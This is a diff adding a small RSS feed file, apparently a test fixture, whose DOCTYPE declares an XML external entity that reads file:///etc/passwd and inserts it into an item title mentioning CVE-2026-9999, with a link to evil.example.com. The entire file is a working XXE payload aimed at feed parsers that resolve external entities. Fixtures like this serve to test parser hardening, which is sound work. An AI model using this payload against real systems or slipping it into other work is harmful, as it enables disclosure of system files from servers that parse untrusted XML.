@@ -1,0 +1,5 @@
+<?xml version="1.0"?>
+<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<rss version="2.0"><channel><title>x</title>
+<item><title>&xxe; CVE-2026-9999</title><link>http://evil.example.com/</link><guid>xxe-1</guid></item>
+</channel></rss>
